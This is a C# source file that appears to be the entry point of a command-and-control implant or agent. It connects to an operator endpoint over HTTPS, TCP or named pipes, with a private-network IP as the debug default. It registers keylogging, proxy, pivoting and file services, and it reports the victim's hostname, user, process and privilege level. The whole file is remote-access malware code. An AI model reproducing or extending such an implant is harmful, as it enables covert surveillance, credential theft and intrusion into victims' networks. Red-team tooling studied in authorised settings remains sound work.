using Agent.Communication;
using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {

        static void Main(string[] args)
        {

#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
#endif

#if DEBUG
            if (args.Count() == 0)
                args = new string[] { "https://192.168.56.103:443" };
            //args = new string[] { "pipe://192.168.56.103:aaaaaaaaaa" };
            //args = new string[] { "tcps://127.0.0.1:4545" };
            //args = new string[] { "pipes://127.0.0.1:foo" };
#endif
            if (args.Count() == 0)
            {
                Debug.WriteLine("No Endpoint set, quitting...");
                return;
            }

            string connUrl = args[0];
            var connexion = ConnexionUrl.FromString(connUrl);

            if (!connexion.IsValid)
            {
                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiiting...");
                return;
            }

            var metaData = GenerateMetadata(connexion.ToString());



            ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
            ServiceProvider.RegisterSingleton<IFileService>(new FileService());

            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
            ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());


            var commModule = CommunicationFactory.CreateCommunicator(connexion);
            var agent = new Models.Agent(metaData, commModule);

            Thread agentThread = new Thread(agent.Start);
            agentThread.Start();
            agentThread.Join();
        }


        static AgentMetadata GenerateMetadata(string endpoint)
        {
            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            string integrity = "Medium";
            if (userName == "SYSTEM")
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            AgentMetadata metadata = new AgentMetadata()
            {
                Id = ShortGuid.NewGuid(),
                Hostname = Environment.MachineName,
                UserName = userName,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
                Integrity = integrity,
                EndPoint = endpoint,
                Version = "Net v6.0",
            };

            return metadata;
        }
    }
}
